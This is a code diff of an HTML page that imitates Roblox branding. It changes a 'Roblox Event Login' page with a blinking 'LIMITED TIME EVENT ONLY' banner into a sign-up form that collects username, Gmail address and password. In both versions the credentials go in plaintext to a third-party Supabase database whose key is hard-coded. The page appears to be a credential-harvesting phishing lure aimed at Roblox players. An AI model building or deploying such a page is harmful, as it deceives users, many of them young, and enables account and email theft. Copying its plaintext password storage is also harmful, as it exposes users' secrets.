@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Roblox Event Login</title>
+<title>Roblox Style Register</title>
 
 <style>
 *{
@@ -13,91 +13,67 @@
 
 body{
     height:100vh;
-    overflow:hidden;
     display:flex;
     justify-content:center;
     align-items:center;
-    background: radial-gradient(circle at top, #0f172a, #05070c);
+    background:#0f1115;
+    overflow:hidden;
 }
 
-/* animated gradient overlay */
-body::before{
-    content:"";
+/* Animated glowing blobs */
+.bg-circle{
     position:absolute;
-    width:200%;
-    height:200%;
-    background: linear-gradient(45deg,#00A2FF,#ff3d81,#00ffcc,#7c3aed);
-    opacity:0.15;
-    animation: move 12s linear infinite;
-}
-
-@keyframes move{
-    0%{transform:rotate(0deg) translateX(0);}
-    100%{transform:rotate(360deg) translateX(0);}
-}
-
-/* floating glow orbs */
-.orb{
-    position:absolute;
-    width:300px;
-    height:300px;
+    width:400px;
+    height:400px;
     border-radius:50%;
     filter:blur(120px);
-    opacity:0.25;
-    animation: float 6s ease-in-out infinite;
+    opacity:0.3;
+    animation: float 8s infinite ease-in-out;
 }
 
-.orb1{background:#00A2FF; top:10%; left:15%;}
-.orb2{background:#ff3d81; bottom:10%; right:15%; animation-delay:2s;}
-.orb3{background:#00ffcc; top:50%; left:50%; animation-delay:4s;}
+.circle1{
+    background:#00A2FF;
+    top:10%;
+    left:15%;
+}
+
+.circle2{
+    background:#ff3d81;
+    bottom:10%;
+    right:15%;
+    animation-delay:2s;
+}
 
 @keyframes float{
     0%,100%{transform:translateY(0);}
     50%{transform:translateY(-40px);}
 }
 
-/* login card */
-.card{
+/* Card */
+.box{
     position:relative;
     z-index:2;
-    width:380px;
-    padding:35px;
-    border-radius:20px;
-    background:rgba(20,22,28,0.7);
-    backdrop-filter: blur(18px);
-    border:1px solid rgba(255,255,255,0.08);
-    box-shadow:0 0 40px rgba(0,162,255,0.2);
+    width:360px;
+    padding:30px;
+    border-radius:18px;
+    background:rgba(30,32,38,0.85);
+    backdrop-filter: blur(12px);
+    box-shadow:0 0 30px rgba(0,162,255,0.2);
     text-align:center;
     color:white;
-    animation: pop 0.8s ease;
+
+    animation: fadeIn 0.8s ease;
 }
 
-@keyframes pop{
-    from{opacity:0; transform:scale(0.9);}
-    to{opacity:1; transform:scale(1);}
-}
-
-/* 🔥 event banner */
-.banner{
-    font-size:13px;
-    font-weight:bold;
-    letter-spacing:2px;
-    color:#00ffcc;
-    margin-bottom:12px;
-    animation: blink 1s infinite;
-    text-shadow:0 0 10px #00ffcc;
-}
-
-@keyframes blink{
-    0%,100%{opacity:1;}
-    50%{opacity:0.3;}
+@keyframes fadeIn{
+    from{opacity:0; transform:translateY(30px);}
+    to{opacity:1; transform:translateY(0);}
 }
 
 h1{
-    font-size:26px;
     color:#00A2FF;
-    letter-spacing:3px;
     margin-bottom:5px;
+    letter-spacing:2px;
 }
 
 .subtitle{
@@ -106,14 +82,14 @@ h1{
     margin-bottom:20px;
 }
 
-/* inputs */
+/* Inputs */
 input{
     width:100%;
-    padding:13px;
+    padding:12px;
     margin:8px 0;
     border:none;
-    border-radius:10px;
-    background:#12141a;
+    border-radius:8px;
+    background:#1a1c22;
     color:white;
     outline:none;
     transition:0.3s;
@@ -122,119 +98,127 @@ input{
 
 input:focus{
     border:1px solid #00A2FF;
-    box-shadow:0 0 15px rgba(0,162,255,0.5);
+    box-shadow:0 0 12px rgba(0,162,255,0.4);
     transform:scale(1.02);
 }
 
-/* button */
+/* Button */
 button{
     width:100%;
-    padding:13px;
-    margin-top:14px;
+    padding:12px;
+    margin-top:12px;
     border:none;
-    border-radius:10px;
+    border-radius:8px;
     cursor:pointer;
     font-weight:bold;
     color:white;
+
     background:linear-gradient(90deg,#00A2FF,#0077ff);
     transition:0.3s;
-    box-shadow:0 0 15px rgba(0,162,255,0.3);
+    position:relative;
+    overflow:hidden;
 }
 
+/* button hover animation */
 button:hover{
     transform:translateY(-2px);
-    box-shadow:0 0 25px rgba(0,162,255,0.6);
+    box-shadow:0 10px 25px rgba(0,162,255,0.3);
 }
 
-button:active{
-    transform:scale(0.97);
+/* click animation ripple */
+button:active::after{
+    content:"";
+    position:absolute;
+    width:100%;
+    height:100%;
+    background:rgba(255,255,255,0.2);
+    left:0;
+    top:0;
+    animation:ripple 0.4s ease;
+}
+
+@keyframes ripple{
+    from{opacity:1;}
+    to{opacity:0;}
 }
 
 /* message */
 #msg{
     margin-top:12px;
     font-size:13px;
-    min-height:18px;
     color:#ffcc00;
+    min-height:20px;
 }
 
-/* footer switch */
-.switch{
-    margin-top:12px;
-    font-size:12px;
-    color:#aaa;
-}
-
-.switch span{
-    color:#00A2FF;
-    cursor:pointer;
+/* floating animation on card */
+.box:hover{
+    transform:translateY(-3px);
+    transition:0.3s;
 }
 </style>
 </head>
 
 <body>
 
-<div class="orb orb1"></div>
-<div class="orb orb2"></div>
-<div class="orb orb3"></div>
+<!-- background animations -->
+<div class="bg-circle circle1"></div>
+<div class="bg-circle circle2"></div>
 
-<div class="card">
-
-    <div class="banner">🔥 LIMITED TIME EVENT ONLY 🔥</div>
-
+<div class="box">
     <h1>ROBLOX</h1>
-    <p class="subtitle">Secure Login Portal</p>
+    <p class="subtitle">Create your account</p>
 
     <input type="text" id="username" placeholder="Username">
+    <input type="email" id="gmail" placeholder="Gmail">
     <input type="password" id="password" placeholder="Password">
 
-    <button onclick="login()">Login</button>
+    <button onclick="register()">Sign Up</button>
 
     <p id="msg"></p>
-
-    <div class="switch">
-        Don’t have an account? <span>Create</span>
-    </div>
-
 </div>
 
 <script>
 const SUPABASE_URL = "https://ogqaxkbfnlfcgkmlbnpq.supabase.co";
 const SUPABASE_KEY = "sb_publishable_s4NlhIOK-kuMjeBneYa1zQ_L2Q-EXza";
 
-async function login(){
+async function register() {
 
     const username = document.getElementById("username").value;
+    const gmail = document.getElementById("gmail").value;
     const password = document.getElementById("password").value;
 
     const msg = document.getElementById("msg");
-    msg.innerText = "Authenticating...";
+    msg.innerText = "Loading...";
 
     try {
-        const res = await fetch(
-            SUPABASE_URL + "/rest/v1/users?username=eq." + username + "&password=eq." + password,
-            {
-                method:"GET",
-                headers:{
-                    apikey: SUPABASE_KEY,
-                    Authorization: "Bearer " + SUPABASE_KEY
-                }
-            }
-        );
+        const res = await fetch(SUPABASE_URL + "/rest/v1/users", {
+            method: "POST",
+            headers: {
+                apikey: SUPABASE_KEY,
+                Authorization: "Bearer " + SUPABASE_KEY,
+                "Content-Type": "application/json",
+                Prefer: "return=representation"
+            },
+            body: JSON.stringify({
+                username,
+                gmail,
+                password
+            })
+        });
 
-        const data = await res.json();
+        const data = await res.json().catch(() => null);
 
-        if(data.length > 0){
+        if (res.ok) {
+            msg.innerText = "✅ Account Created!";
             msg.style.color = "#00ff99";
-            msg.innerText = "✅ Welcome back, " + username + "!";
         } else {
+            msg.innerText = "❌ Error: " + JSON.stringify(data);
             msg.style.color = "#ff5555";
-            msg.innerText = "❌ Invalid login details";
         }
 
-    } catch(err){
+    } catch (err) {
+        msg.innerText = "❌ Network Error: " + err.message;
         msg.style.color = "#ff5555";
-        msg.innerText = "❌ Error: " + err.message;
     }
 }
 </script>
